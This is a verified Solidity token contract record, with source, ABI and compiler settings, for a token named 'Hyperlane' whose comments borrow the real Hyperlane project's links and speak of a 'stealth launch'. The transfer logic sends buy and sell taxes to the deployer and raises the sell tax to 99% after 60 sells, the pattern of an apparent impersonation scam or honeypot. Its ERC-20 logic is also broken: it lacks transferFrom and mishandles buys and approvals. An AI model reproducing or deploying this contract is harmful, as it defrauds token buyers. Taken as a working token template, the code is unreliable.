{"SourceCode": "// Hyperlane Token\r\n\r\n// PERMISSIONLESS INTEROPERABILITY\r\n// Hyperlane is the first interoperability layer that enables you to permissionlessly connect any blockchain, out-of-the-box.\r\n// Discord: https://discord.com/invite/VK9ZUy3aTV\r\n// Twitter: https://twitter.com/Hyperlane_xyz\r\n// Website: https://www.hyperlane.xyz/\r\n// Note that burning the initial LP and renouncing might take up to 20 minutes after deploying the contract\r\n// We love a stealth launch ;)\r\n\r\npragma solidity ^0.8.18;\r\n\r\n// SPDX-License-Identifier: MIT\r\ninterface IUniswapV2Router {\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract HyperlaneToken {\r\n    string public name = \"Hyperlane\";\r\n    string public symbol = \"Hyperlane\";\r\n    uint256 public totalSupply = 5000000;\r\n    uint256 public buyTax = 20;\r\n    uint256 public sellTax = 50;\r\n    uint256 public buyCount = 0;\r\n    uint256 public sellCount = 0;\r\n    address public deployer;\r\n    mapping(address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) public allowances;\r\n    IUniswapV2Router public uniswapV2Router;\r\n\r\n    constructor() {\r\n        balances[msg.sender] = totalSupply;\r\n        deployer = msg.sender;\r\n        uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        require(balances[msg.sender] >= amount, \"Not enough tokens\");\r\n\r\n        if (recipient == address(this)) {\r\n            // Buy\r\n            if (buyCount < 20) {\r\n                buyTax = 20;\r\n            } else {\r\n                buyTax = 5;\r\n            }\r\n            buyCount += 1;\r\n            uint256 taxAmount = (amount * buyTax) / 100;\r\n            balances[msg.sender] -= taxAmount;\r\n            balances[deployer] += taxAmount;\r\n            balances[msg.sender] -= amount - taxAmount;\r\n            balances[recipient] += amount - taxAmount;\r\n        } else if (msg.sender == address(this)) {\r\n            // Sell\r\n            if (sellCount < 40) {\r\n                sellTax = 50;\r\n            } else if (sellCount < 60) {\r\n                sellTax = 5;\r\n            } else {\r\n                sellTax = 99;\r\n            }\r\n            sellCount += 1;\r\n            uint256 taxAmount = (amount * sellTax) / 100;\r\n            balances[msg.sender] -= taxAmount;\r\n            balances[deployer] += taxAmount;\r\n            balances[msg.sender] -= amount - taxAmount;\r\n            balances[recipient] += amount - taxAmount;\r\n        } else {\r\n            // Normal transfer\r\n            balances[msg.sender] -= amount;\r\n            balances[recipient] += amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function addLiquidity(uint amountTokenDesired, uint amountTokenMin, uint amountETHMin) external payable onlyDeployer {\r\n        // Approve the Uniswap router to spend our tokens\r\n        approve(address(uniswapV2Router), amountTokenDesired);\r\n\r\n        // Add liquidity to the pool\r\n        uniswapV2Router.addLiquidityETH{value: msg.value}(\r\n            address(this),\r\n            amountTokenDesired,\r\n            amountTokenMin,\r\n            amountETHMin,\r\n            msg.sender,\r\n            block.timestamp + 300 // deadline 5 minutes from now\r\n        );\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool) {\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        allowances[msg.sender][spender] = value;\r\n\r\n        return true;\r\n    }\r\n\r\n    modifier onlyDeployer() {\r\n      require(msg.sender == deployer);\r\n      _; \r\n   }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountTokenDesired\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amountTokenMin\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amountETHMin\",\"type\":\"uint256\"}],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deployer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HyperlaneToken", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://eade2c8ef10fb49a9055d850611115217151d07359af263d637b27555511135a"}